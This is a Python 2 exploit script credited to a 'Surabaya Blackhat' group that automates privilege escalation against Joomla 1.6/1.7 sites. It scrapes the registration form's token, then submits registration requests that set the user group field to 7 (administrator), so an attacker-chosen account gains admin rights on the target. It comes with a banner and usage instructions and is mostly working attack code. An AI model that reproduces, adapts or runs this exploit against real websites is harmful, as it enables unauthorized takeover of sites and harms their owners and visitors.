#!/usr/bin/python
# Joomla Com_User Auto Exploit
# By xSecurity
# Modif Sign by SunDi3yansyah | Surabaya Blackhat

import requests as sec4ever, re, urllib, sys, os
from threading import Thread 
from time import sleep
def cls():
	os.system(['clear','cls'][os.name =='nt'])

cls()
print '''
   ____                  _                         ____  _            _    _           _   
  / ___| _   _ _ __ __ _| |__   __ _ _   _  __ _  | __ )| | __ _  ___| | _| |__   __ _| |_ 
  \___ \| | | | '__/ _` | '_ \ / _` | | | |/ _` | |  _ \| |/ _` |/ __| |/ / '_ \ / _` | __|
   ___) | |_| | | | (_| | |_) | (_| | |_| | (_| | | |_) | | (_| | (__|   <| | | | (_| | |_ 
  |____/ \__,_|_|  \__,_|_.__/ \__,_|\__, |\__,_| |____/|_|\__,_|\___|_|\_\_| |_|\__,_|\__|
                                     |___/                                                 
                                              _      _               
                        |  _  _.._._  _|_ _  |_) _  |_) __|__|_ _ ._ 
                        |_(/_(_|| | |  |_(_) |_)(/_ |_)(/_|_ |_(/_| 
        ---------------------------------------------------------------------
Joomla Version [1.6|1.7] [Com_User] Auto Exploit
Require Need Install Requests Python Package (Cari di google)
--------------------------------------------------------------
Surabaya Blackhat | Surabaya Hackerlink | Yogyakarta Blackhat
--------------------------------------------------------------
Please wait...'''

pwd2 = 'fio3jfiej9cewc9c9w0eufew9u'
def one(target,pwd1,pwd2,email):
	# Wrong Password
	x1 = xsec.get(target+'/index.php?option=com_users&view=registration')
	token = re.findall('type="hidden" name="(.*?)" value="1"', x1.text)
	post = {}
	post["jform[name]"] = 'SunDi3yansyah'
	post["jform[username]"] = user
	post["jform[password1]"] = pwd1
	post["jform[password2]"] = pwd2
	post["jform[email1]"] = email
	post["jform[email2]"] = email
	post["jform[groups][]"] = "7"
	post["option"] = "com_users"
	post["task"] = "registration.register"
	post[token[0]] = "1"
	p1 = xsec.post(target+'/index.php?option=com_users&view=registration', data=urllib.urlencode(post))
	x2 = xsec.get(target+'/index.php/component/users/?view=registration&layout=complete')

def exploit(target,pwd1,pwd2,email):
	# Wrong Password
	x3 = xsec.get(target+'/index.php?option=com_users&view=registration')
	token = re.findall('type="hidden" name="(.*?)" value="1"', x3.text)
	post = {}
	post["jform[name]"] = 'SunDi3yansyah'
	post["jform[username]"] = user
	post["jform[password1]"] = pwd1
	post["jform[password2]"] = pwd1
	post["jform[email1]"] = email
	post["jform[email2]"] = email
	post["jform[groups][]"] = "7"
	post["option"] = "com_users"
	post["task"] = "registration.register"
	post[token[0]] = "1"
	p2 = xsec.post(target+'/index.php?option=com_users&view=registration', data=urllib.urlencode(post))
	x4 = xsec.get(target+'/index.php/component/users/?view=registration&layout=complete')

xsec = sec4ever.session()
if len(sys.argv) == 5:
	target = sys.argv[1]
	user = sys.argv[2]
	pwd1 = sys.argv[3]
	email = sys.argv[4]
	one(target,pwd1,pwd2,email)
	ex = exploit(target,pwd1,pwd2,email)
	print ' * Go To Your Email & Active Then Login \n * Username: '+user+' & Password: '+pwd1
else:
	print "Usage: python tool.py http://target.com/ youruser yourpass yourmail"
